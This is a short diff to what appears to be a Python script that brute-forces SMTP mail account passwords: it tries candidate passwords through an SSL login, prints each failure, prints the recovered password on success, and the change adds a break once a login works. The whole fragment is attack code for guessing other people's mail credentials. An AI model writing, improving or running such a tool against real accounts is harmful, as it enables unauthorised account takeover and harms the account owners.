@@ -55,6 +55,7 @@ def trial_with_ssl(mail_user, mail_pass):
             server_ssl.login(mail_user, password)
             print("Founded with easyway")
             print("password for " + mail_user + " is " + password)
+            break
         except SMTPAuthenticationError:
             print(password)
             
